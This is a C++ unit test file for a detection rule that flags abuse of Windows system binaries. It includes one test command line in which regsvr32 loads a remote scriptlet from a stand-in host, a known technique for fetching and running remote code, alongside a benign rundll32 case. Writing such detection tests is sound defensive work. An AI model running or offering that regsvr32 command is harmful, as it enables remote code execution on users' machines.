#include "rules/LolbinExecutionRule.hpp"

#include "ut_main.hpp"

namespace {
   suite<"[LolbinExecutionRule]"> _ = [] {
      using vigil::ProcessInfo;
      using vigil::platform::rules::LolbinExecutionRule;
      using vigil::rules::RuleConfig;

      "[FiresForRegsvr32RemoteScriptlet]"_test = [] {
         LolbinExecutionRule rule{RuleConfig{}};
         ProcessInfo info;
         info.name = "regsvr32.exe";
         info.cmdline = "regsvr32.exe /s /n /u /i:http://example.test/a.sct scrobj.dll";

         expect(rule.evaluate(info).has_value());
      };

      "[DoesNotFireForBenignRundll32]"_test = [] {
         LolbinExecutionRule rule{RuleConfig{}};
         ProcessInfo info;
         info.name = "rundll32.exe";
         info.cmdline = "rundll32.exe shell32.dll,Control_RunDLL";

         expect(!rule.evaluate(info).has_value());
      };
   };
} // namespace
